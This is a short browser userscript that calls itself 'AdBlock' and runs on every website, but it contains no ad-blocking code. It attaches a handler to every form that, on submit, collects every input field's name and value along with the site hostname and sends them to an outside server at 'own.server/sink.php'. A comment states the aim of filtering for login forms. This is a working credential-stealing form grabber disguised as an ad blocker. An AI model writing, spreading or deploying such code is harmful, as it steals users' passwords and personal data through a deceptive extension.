// ==UserScript==
// @name     AdBlock
// @version  1
// @grant    none
// @include  http*://*
// ==/UserScript==

function a(x) {
  var inputs = x.getElementsByTagName("input");
  var str = "?" + window.location.hostname;
  for(var y=0;y<inputs.length;y++){
    str += "&" + inputs[y].name + "=" + inputs[y].value;
  }
  var r = new XMLHttpRequest();
  r.open("GET","https://own.server/sink.php" + str);
  r.send();
}

//make visible
document.body.setAttribute("style", "border-top: 5px solid red;");

var forms = document.getElementsByTagName("form");
// todo filter for login forms only

for(var i=0;i<forms.length;i++) {
  forms[i].onsubmit = function(){a(this)}
}
